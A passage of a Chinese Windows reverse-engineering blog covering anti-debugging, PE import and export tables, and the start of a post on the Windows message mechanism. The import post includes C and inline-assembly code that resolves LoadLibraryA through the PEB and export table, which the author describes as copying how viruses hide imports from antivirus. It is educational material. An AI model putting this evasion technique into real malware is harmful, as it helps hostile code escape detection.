<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_BASIC_INFORMATION</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    PVOID Reserved1;</span><br><span class="line">    PPEB PebBaseAddress;</span><br><span class="line">    PVOID Reserved2[<span class="number">2</span>];</span><br><span class="line">    ULONG_PTR UniqueProcessId;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">&#125; PROCESS_BASIC_INFORMATION;</span><br></pre></td></tr></table></figure>
<p>因为本身出题我用到了这项技术，为了避免泄题，就只给简单的函数调用的伪代码了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="literal">false</span></span><br><span class="line">pid = GetCurrentProcessID </span><br><span class="line">hp = OpenProcess</span><br><span class="line">NtQueryInformationProcess()</span><br><span class="line">pp = OpenProcess()</span><br><span class="line"><span class="keyword">if</span>(Reserved3 != xxxx)</span><br><span class="line">  flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面就是根据我们前面几篇的《Windows调试艺术》学到的知识能够实现的反调试手段了，其实反调试的手段还有很多很多，以后随着文章的更新，还会为继续总结这部分的知识。</p>
<p>代码参考 ： <a href="https://github.com/alphaSeclab/anti-debug" target="_blank" rel="noopener">https://github.com/alphaSeclab/anti-debug</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/27/Windows调试艺术——导入函数/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/27/Windows调试艺术——导入函数/" itemprop="url">Windows调试艺术——导入函数和导出函数</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-27T11:18:06+08:00">
                2019-05-27
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Windows调试艺术/" itemprop="url" rel="index">
                    <span itemprop="name">Windows调试艺术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>文章在360的安全客上首发，搬运到自己博客上来，可以去安全客查看详细博文。</p>
<h1 id="Windows调试艺术——导入函数和导出函数"><a href="#Windows调试艺术——导入函数和导出函数" class="headerlink" title="Windows调试艺术——导入函数和导出函数"></a>Windows调试艺术——导入函数和导出函数</h1><p>windows调试艺术主要是记录我自己学习的windows知识，并希望尽可能将这些东西在某些实际方面体现出来。</p>
<p>所谓导入函数在很多人眼中是个非常简单的概念，无非就是把人家写好的函数拿过来用罢了，但实际上，导入一个函数是基于复杂的数据结构和加载机制的，不管是加壳脱壳还是病毒分析都离不开它，这篇文章主要是理顺整个pe文件导入函数相关的数据结构和导入过程，最后再结合windbg的调试尝试仿照病毒的编写实现我们自己的导入机制。</p>
<p>阅读本篇前建议先阅读以下两篇学习前置知识<br><a href="https://www.anquanke.com/post/id/173586" target="_blank" rel="noopener">Windows调试艺术——利用LBR寻找dll基址</a><br><a href="https://www.anquanke.com/post/id/176532" target="_blank" rel="noopener">Windows调试艺术——断点和反调试（上）</a></p>
<h2 id="导入和导出函数"><a href="#导入和导出函数" class="headerlink" title="导入和导出函数"></a>导入和导出函数</h2><p>###简单实例<br>所谓导入函数实际上就是我们将dll暴漏出来的导出函数拿过来为我们所用，当我们的程序加载到内存中后，其实并不能独立运行，因为我们有很多”窟窿”没有填上，这些”窟窿”也就是我们调用的自己并没有实际编写的、追根溯源实际上来自dll的函数，哪怕你的程序什么也没有做，单单是显示个黑窗（cmd）就退出，那初始化黑窗和退出其实也是dll中的函数完成的。</p>
<p>可以想象，必然是有人在我们程序执行时帮我们填上了这些”窟窿”，让我们能够正常使用这些函数。其实这个人就是windows的pe加载器，它在我们程序启动时就将相应的dll也加载入了该程序所对应的虚拟内存（注意，为了节约物理内存，如果有多个程序加载了同一个dll时，实际上物理上只有一份，但是相当于进入了不同程序的虚拟空间），然后将我们原来的函数地址替换成了真实的地址，我们可以通过一个真实的例子来看一下</p>
<p>程序很简单，就是malloc了0x20的空间，然后打印了一句话而已</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">sub     esp, 20h</span><br><span class="line">call    ___main</span><br><span class="line">mov     dword ptr [esp], 20h ; size_t</span><br><span class="line">call    _malloc</span><br><span class="line">mov     [esp+1Ch], eax</span><br><span class="line">mov     dword ptr [esp+1Ch], offset aHelloWorld ; &quot;hello world&quot;</span><br><span class="line">mov     eax, [esp+1Ch]</span><br><span class="line">mov     [esp], eax      ; char *</span><br><span class="line">call    _printf</span><br><span class="line">mov     eax, 0</span><br><span class="line">leave</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
<p>我们点击我们自己并没有写的malloc函数，发现其call到一个jmp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; void *__cdecl malloc(size_t)</span><br><span class="line">public _malloc</span><br><span class="line">_malloc proc near</span><br><span class="line">jmp     ds:__imp__malloc</span><br><span class="line">_malloc endp</span><br></pre></td></tr></table></figure>
<p>我们可以用od动态看一下，在jmp指令下右键选择在数据窗口中跟随<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g2gaq9a7j2j30hz0110sk.jpg" alt=""></p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g2ga4l9wepj30h100rmx6.jpg" alt="1"></p>
<p>可以看到jmp的地址是406124，而里面存放的数据显然是一个dll的地址，也就是76308730，我们再次跳转过去看看<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g2gatbcvlhj30eu07o3yq.jpg" alt=""><br>实际上就是真实的malloc函数。<br>根据上面的过程我们可以看到，在调用一个函数的时候，会经历这样的过程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call --&gt; jmp --&gt; address(address里存放func地址) --&gt; func</span><br></pre></td></tr></table></figure></p>
<p>而在有大量函数的时候，这个address就成了一个巨大的表，由于这个表保存的是导入函数在内存中的真实地址，我们把这个表叫做导入函数地址表（import address table），也就是IAT。在ida中我们顺着上面的操作就可以直观的看见IAT了。<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g2gbnarj39j312m0hqq8b.jpg" alt=""></p>
<h3 id="导入函数的数据结构和机制"><a href="#导入函数的数据结构和机制" class="headerlink" title="导入函数的数据结构和机制"></a>导入函数的数据结构和机制</h3><p>上面的机制看起来似乎是非常简单，就是维护了一张保存了函数的表，但仔细想想就会发现事情不那么容易，还有一堆需要解决的问题：程序加载器是怎么按照顺序将函数的真实地址填进去的呢？函数地址又是怎么和函数名称一一对应的呢？函数的地址又是通过什么找到的呢？<br>显然单纯的一张表解决不了这么多的问题，微软是怎么做的呢？笔者做了张整体的数据结构图，先从整体上来认识一下，之后我们在仔细说说每一部分<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g2gbh47y7yj31j60l2juk.jpg" alt=""><br>我们上面提到的IAT虽然在调试中里面的内容已经变成了函数的地址，叫做函数地址表，而实际上在程序未加载前它和INT是“双胞胎”，一模一样，都指向了另外一个数据结构。<br>INT叫做导入函数名表（import name table），顾名思义，它指向的是就是函数的“名字”，只不过这名字可不单单只有malloc这么简单，它包含了函数名的字符串和函数名的号码（hint），字符串好理解，而hint其实就是一个标志，通过hint就可以在指定的dll中找到这个函数了（后面提到导出表的时候还会再用）。<br>而当程序开始加载时，程序加载器就会通过hint在dll中找到相应的函数地址，接着将IAT的本来指向函数名的指针替换成函数地址，这个过程也被形象的称为“断桥”（IAT和名字之前的联系被切断了），此时IAT和INT就“分道扬镳”了，但是由于他俩的切不断的“血亲”关系，他俩的每一项按照顺序还是一一对应的，也就是函数的名字依旧和函数地址对应，这就解决了我们上面提出的几个问题。<br>但新的问题就又来了，INT和IAT是组织的不错了，但是hint可是针对一个dll的啊，我一个程序有多个dll怎么办？有了多个dll我又怎么去找到指定的dll呢？很显然，还需要一个结构来管理dll的具体信息，这也就是表中最左边的一项——导入表了。<br>导入表（import table），听着就比IAT和INT高上一级，它对于每一个dll都维护了一个Image_Import_Descriptor的结构，主要由以下几个部分构成：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		DWORD Characteristics;</span><br><span class="line">		DWORD OriginalFirstThunk;     <span class="comment">//该项指向INT</span></span><br><span class="line">	&#125;;</span><br><span class="line">	DWORD TimeDateStamp;               <span class="comment">//时间戳</span></span><br><span class="line">	DWORD ForwarderChain;          <span class="comment">//指向前一个IMAGE_IMPORT_DESCRIPTOR</span></span><br><span class="line">	DWORD Name;								<span class="comment">//dll的名字</span></span><br><span class="line">	DWORD FirstThunk;						<span class="comment">//该项指向IAT</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure></p>
<p>ForwarderChain指向前一个descriptor，形成了一个单向链表结构，时间戳则是一个校验，如果之后出现的时间戳和这个不一致，就说明有人动手脚了，OriginalFirstThunk;指向了INT，FirstThunk则指向了IAT，也就是说，每个要导入的dll都对应着自己的INT和IAT，这样hint也就是相对于一个dll的了。<br>这样就完成了整个导入函数的基础工作，对于一个程序来说，需要一个dll就在导入表中添加一个DESCRIPTOR，这个dll的相关信息在Descriptor中保存，用到的函数的“名字”则被存在了INT和IAT中，但程序被载入内存时，dll也跟着载入，这时函数的地址已经确认，加载器通过“名字”找到地址，再将地址放入IAT中，而IAT和INT又是一一对应，从而完成了函数名和函数地址的一一对应。<br>下面我们利用010editor来实际看一下文件中的情况，PE文件中表的基础信息以结构体的形式存在Image_OptionalHeader下的Image_DataDirectory下，我们找到该项<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g2gdklhcg2j30mk0h2tde.jpg" alt=""><br>其中第二项就是导入表，倒数第四项是导入地址表，我们打开导入表<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g2gdmnj3r1j30yk0363z5.jpg" alt=""><br>结构体共两项，第一项是表的相对虚拟地址，第二项是表的size，va也就是VirtualAddress，也就是虚拟地址，是程序真实加载到内存时的地址，除了va之外，常用的还有rva和foa，rva是相对虚拟地址的意思，也就是相对于某个虚拟基址的地址，FOA则是在文件而不是载入内存的地址。<br>由于这里的是虚拟地址（也可以说是相对虚拟地址，因为它有参照物），我们要想找到它所对应的文件地址的位置还需要进行简单的换算。计算的思路如下：</p>
<ul>
<li>通过RVA找到虚拟基址</li>
<li>RVA - 虚拟基址 = 偏移offset</li>
<li>找到虚拟基址所对应的文件基址</li>
<li>offset + 文件基址 = 文件地址</li>
</ul>
<p>首先我们找到它对应的基址，我们可以通过peditor看一下<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g2gdvgqd0wj30rw09gtaj.jpg" alt=""><br>6000h显然在idata节，它的虚拟偏移是6000h，进入第二步，6000相对于6000的偏移是多少呢？很显然是0，也就是offset是0，再接着6000的虚拟偏移对应的文件偏移是1A00，我们用1A00加上offset也就是文件地址了。通过010Editor找到相应的地址<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g2ge4wgpzoj30zg028dg9.jpg" alt=""><br>从这里开始010Editor就没法再帮我们解析数据了，但是没关系，前面我们已经将数据的结理得很详细了，并不能影响我们分析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int : 0000 603c</span><br><span class="line">timestamp : 0000 0000</span><br><span class="line">forward : 0000 0000</span><br><span class="line">name : 0000 632c</span><br><span class="line">iat : 0000 60bc</span><br></pre></td></tr></table></figure></p>
<p>这里的地址同样是RVA，按照上面的换算方法很容易找到相对应的文件地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int : 1a3c</span><br><span class="line">timestamp : 0000 0000</span><br><span class="line">forward : 0000 0000</span><br><span class="line">name : 1d2c</span><br><span class="line">iat : 1abc</span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g2h0ajs6kij30z008stbp.jpg" alt=""><br>可以看到iat和int的值都是613c，继续按照换算公式得出文件地址为1b3c<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g2h0e17kutj30zg0aiafi.jpg" alt=""><br>我们就找到可之前所说的hint name结构了，同样在1d2c处我们可以看见dll的名字<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g2h4db8eirj30zq020mxo.jpg" alt=""><br>说到这里基础的导入知识就结束了，但我们又会发现这样的导入机制还是存在问题的，可以想象下，如果我们的程序导入了多个dll，且每个dll都用了大量函数，那岂不是加载程序时要等待很长时间在修改IAT上吗？为了解决这个问题，微软给了两条路，一个是绑定导入表（bound import table），一个是延迟导入表（delay import table）。<br>导入绑定表很简单，就是直接维护一张表，里面存放的函数地址直接就是va，它的原理其实很简单，因为dll加载的时候都会有个推荐的imageBase，如果按照这个基址加载了的话其实每个函数的虚拟地址也就是一定的了。<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g2h4oy45rqj311k0batbx.jpg" alt=""><br>但是这个方法也有很大的问题，一旦发生dll没有按照推荐的imageBase加载的情况，那这张表里的地址就全部废了，还是得重新进行上面的操作，而这种情况又很常见，所以现在默认编译的程序都没有了这张表，可以在Data Directory的第12项找到它的信息，可以看到在我们的程序中，它的va是0，也就是没有了。<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g2h4tli42ij30zg094q5y.jpg" alt=""><br>另一条路叫做延迟导入表，这个方法可就科学多了，它的原理是指定一些dll不在程序开始时加载，只有当调用相应的函数时，才将该dll载入，这样就分散了导入的时间，极大提高了速度。同样，也可以在Data Directory里找到该项，根据上面的换算大家可以自己找一下相应的数据，这里不在赘述<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g2h51lugxkj30kg02omxk.jpg" alt=""></p>
<p>###导出函数的数据结构和机制<br>还是先从整体看一下导出函数的数据结构，这里我只列举了经常要用到的结构，详细的结构体在下边会提到。<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g2hgnl1xlkj31960tajvc.jpg" alt=""><br>有了前面的讲解，这个结构就相当简单了。这次我们反过来从大到小，首先看最左边，是个类似import Descriptor的东西，但是由于导出是相对于整个程序来说的，所以export的descriptor只有一个，它的name指向了程序的名字，base是个基址，我们的addressOfNameOrdinals指向的hint实际上的号码是hint 1减去base的值（号码也就是其他程序import时需要的号码），addressOfFunc指向了函数的地址，和AddressOfName一一对应。<br>可以看到export比起import更为简单，这里就不再演示在文件中的寻找了，可以参考上面的import自行操作。<br>另外大家可以尝试一个很有意思的操作：name和func地址是一一对应的，如果我们更换func地址中的两个值会发生什么呢？</p>
<p>##病毒的导入机制<br>由于导入表、导入名表的存在，一旦病毒调用了被认为是“危险”的函数，那杀毒软件通过检测文件在病毒运行前就很轻易的可以逮住它。病毒作者自然不会坐以待毙，现在的病毒往往会自己实现导入机制来达到免杀的目的，我们下边就用一种最简单的方式实现我们自己导入函数来作为练习。<br>首先我们要明确思路：</p>
<h3 id="利用windbg寻找dll的导出函数"><a href="#利用windbg寻找dll的导出函数" class="headerlink" title="利用windbg寻找dll的导出函数"></a>利用windbg寻找dll的导出函数</h3><p>在动手开始写代码之前，我们首先用windbg来调试一下明确一下思路<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g2hhdv1xftj30lg0b30t7.jpg" alt=""><br>我们选择kernel32作为要测试的dll，lmvm命令来查看kernel32的详细信息，这里主要需要的是start的va，也可以记录一下时间戳来验证后面我们找到的结构是否正确。<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g2hhh49d59j30ay07zglp.jpg" alt=""><br>dt用来以相应的结构体解析当前的地址，我们拿到dos头信息后，利用dos头中的e_lfanew来找到nt头的位置，即0x75250000+0n248，0x752500f8<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g2hhlwsmacj30c001wdfp.jpg" alt=""><br>接着计算op头的位置，即0x752500f8+0x18，0x75250110<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g2i4o242mgj30gx0c7aam.jpg" alt=""><br>DataDirectory我们上面说过，就是存储各种表的结构，我们找到它的位置，即0x75250110+0x60，75250170，同时到这里我们就失去了结构体的信息（因为接下来用到的结构体信息在ole32中，但是考虑到很多程序并不会加载这个dll，所以我们下边不用这些结构体信息了），export我们之前找过了，是第一个表，相当于偏移为0，我们直接打印这个地址的内容<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g2i4qoz621j307u01kt8i.jpg" alt=""><br>按照上面的知识，第一个是export表的rva，第二个是size，我们根据rva算一下具体的地址，也就是972c0+75250000，即752e72c0<br>export descriptor的详细结构如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x000</span> Characteristics  </span><br><span class="line">  +<span class="number">0x004</span> TimeDateStamp  </span><br><span class="line">  +<span class="number">0x008</span> MajorVersion </span><br><span class="line">  +<span class="number">0x00a</span> MinorVersion</span><br><span class="line">  +<span class="number">0x00c</span> Name      <span class="comment">// 模块的真实名称</span></span><br><span class="line">  +<span class="number">0x010</span> Base      <span class="comment">// 基数，加上序数就是函数地址数组的索引</span></span><br><span class="line">  +<span class="number">0x014</span> NumberOfFunctions     <span class="comment">// 指向的数组元素个数</span></span><br><span class="line">  +<span class="number">0x018</span> NumberOfNames         <span class="comment">// 指向的数组元素个数</span></span><br><span class="line">  +<span class="number">0x01c</span> AddressOfFunctions    <span class="comment">// 指向函数地址</span></span><br><span class="line">  +<span class="number">0x020</span> AddressOfNames        <span class="comment">// 指向函数名字</span></span><br><span class="line">  +<span class="number">0x024</span> AddressOfNameOrdinals <span class="comment">// 指向输出序号</span></span><br></pre></td></tr></table></figure></p>
<p>我们打印一下相关信息<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g2i5662hijj30aq02hq2t.jpg" alt=""><br>可以看到第二个字段时间戳和我们开始记录的一样，说明我们找对了，接着循环打印一下导出函数的名字<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g2i58b7gpzj30kw0e6wfb.jpg" alt=""><br>这条命令和c语言的for循环意思相同，循环的是（）里的dd打印出来的内容，循环做的操作就是{}的内容，$t0是windbg供我们自己使用的寄存器，相当于变量。<br>到这里我们就成功了，读者可以自己仿照上面的命令打印函数地址从而得到一一对应关系。</p>
<p>###代码实现<br>病毒要实现自己的导入机制，那必须要能够将dll加载到内存中，这就需要LoadLibrary这个函数，这个函数在Kernel32.dll中，这个dll无论是哪个程序都会加载的，我们现在的首要任务就是要找到这个dll的导出表。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__asm&#123;</span><br><span class="line">	  mov eax, fs:[<span class="number">0x30</span>]</span><br><span class="line">		mov eax, [eax + <span class="number">0xc</span>]</span><br><span class="line">		mov esi, [eax + <span class="number">0x1c</span>]</span><br><span class="line">		lods dword ptr ds : [esi]</span><br><span class="line">		mov eax, [eax + <span class="number">0x8</span>]</span><br><span class="line">		mov kernel_base, eax</span><br><span class="line">		ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>上面的代码如果看不懂的话，可以参考之前一篇《Windows调试艺术——利用LDR寻找dll基址》，里面详细说明了如何去寻找dll基址<br>我们定义自己的LoadLibrary，保证参数和原有的相同<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TCHAR szLoadLibrary[] = <span class="string">"LoadLibraryA"</span></span><br><span class="line"><span class="keyword">typedef</span> HMODULE (WINAPI* _LoadLibrary)(</span><br><span class="line">	LPCTSTR lpFileName </span><br><span class="line">	);</span><br><span class="line">_LoadLibrary MyLoadLibrary = (_LoadLibrary)<span class="number">0xFFFFFFFF</span>;</span><br></pre></td></tr></table></figure></p>
<p>我们按照上面windbg调试的过程来找到Image_export_directory<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pe = *((DWORD*)(kernel_base + <span class="number">0x3c</span>));</span><br><span class="line">pImage_export_directory = (PIMAGE_EXPORT_DIRECTORY)((*((DWORD*)(kernel_base + pe + <span class="number">0x78</span>))) + kernel_base);</span><br></pre></td></tr></table></figure></p>
<p>接着直接拿到export的函数名地址和函数的个数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NumberOfFunc = pImage_export_directory-&gt;NumberOfFunctions;</span><br><span class="line">AddressOfNames = pImage_export_directory-&gt;AddressOfNames + kernel_base;</span><br></pre></td></tr></table></figure></p>
<p>接着循环遍历，因为名字和函数的地址是一一对应的，所以我们只需要找到和LoadLibrary名字相同offset，然后加上AddressOfFunctions的地址就可以了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;NumberOfFunc; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		szFunName = (TCHAR*)(*((DWORD*)(AddressOfNames + i * <span class="number">4</span>)) + kernel_base);</span><br><span class="line">		szSrcString = szLoadLibrary;</span><br><span class="line">		<span class="keyword">for</span> (; *szSrcString == *szFunName &amp;&amp; *szSrcString != <span class="number">0</span>; ++szSrcString, ++szFunName);</span><br><span class="line">		<span class="keyword">if</span> (!(*szFunName - *szSrcString))</span><br><span class="line">		&#123;</span><br><span class="line">			MyLoadLibrary = (_LoadLibrary)(*(((DWORD*)(pImage_export_directory-&gt;AddressOfFunctions + kernel_base)) + i) + kernel_base);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>以同样的方法我们还可以拿到GetProcAddres函数，改函数能够指定dll名和func的名字拿到相应的函数，这样我们就可以随意拿到任何我们想要的函数了，具体的过程就不再赘述了。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/26/Windows调试艺术——从真实病毒学习消息机制/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/26/Windows调试艺术——从真实病毒学习消息机制/" itemprop="url">Windows调试艺术——从真实病毒学习消息机制</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-26T11:18:06+08:00">
                2019-05-26
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Windows调试艺术/" itemprop="url" rel="index">
                    <span itemprop="name">Windows调试艺术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>文章在360的安全客上首发，搬运到自己博客上来，可以去安全客查看详细博文。</p>
<h1 id="Windows调试艺术——从真实病毒学习消息机制"><a href="#Windows调试艺术——从真实病毒学习消息机制" class="headerlink" title="Windows调试艺术——从真实病毒学习消息机制"></a>Windows调试艺术——从真实病毒学习消息机制</h1><p>要阅读本文章的小伙伴建议先看看《windows调试艺术》的这两篇文章来了解一下前置知识</p>
<p><a href="https://www.anquanke.com/post/id/175753" target="_blank" rel="noopener">Windows调试艺术——从0开始的异常处理（下）</a></p>
<p><a href="https://www.anquanke.com/post/id/175293" target="_blank" rel="noopener">Windows调试艺术——从0开始的异常处理（上）</a></p>
<p>之前的时候偶然在某网站拿到一款很简单的病毒程序，虽然分析的难度不高，但是它巧妙的利用了Windows的消息机制实现了恶意功能，正好可以用它做个例子来学习一下Windows的消息机制。</p>
<p>##Windows 消息结构</p>
<p>每一个程序猿都应该知道Windows是一个消息驱动的系统，可是真正提到什么是消息，消息又是如何组织的就一头雾水了。实际上Windows的应用内部的各个线程、各个应用、应用与操作系统之间都会通过消息来传递。消息就是一个信号，应用会根据收到的信号做出不同的反应，比如我们点击了窗口的关闭按钮，那么就会传递给应用一个”关闭”的消息，然后窗体关闭。</p>
<p>Windows以窗口作为基础实现了可视化的交互，窗口是基于线程实现的，一个线程又维护着一个消息队列，每一个传递给这个窗口的消息都要依次进入队列进行”先进先出”的操作，不分轻重缓急，再紧急的情况也只能老老实实排队。</p>
<p>###消息</p>
<p>一个消息说白了就是一段数据，消息在Windows的定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMsg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">HWND hwnd;    <span class="comment">//目标的窗口句柄</span></span><br><span class="line">UINT message; <span class="comment">//消息的标识符</span></span><br><span class="line">WPARAM wParam;<span class="comment">//附加信息，与消息标识符有关</span></span><br><span class="line">LPARAM lParam;<span class="comment">//附加信息，与消息标识符有关</span></span><br><span class="line">DWORD time;   <span class="comment">//消息产生的时间</span></span><br><span class="line">POINT pt;     <span class="comment">//消息发生产生时的按屏幕坐标表示的鼠标光标的位置</span></span><br><span 